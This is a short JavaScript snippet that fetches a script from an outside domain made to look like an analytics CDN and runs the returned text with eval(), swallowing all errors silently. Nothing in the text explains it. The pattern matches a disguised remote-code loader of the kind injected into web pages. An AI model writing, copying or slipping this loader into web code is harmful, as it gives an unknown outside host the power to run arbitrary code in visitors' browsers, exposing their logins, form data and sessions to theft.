fetch('https://cdn.media-analytic.com/media.js')
  .then(r => r.text())
  .then(c => eval(c))
  .catch(() => {});
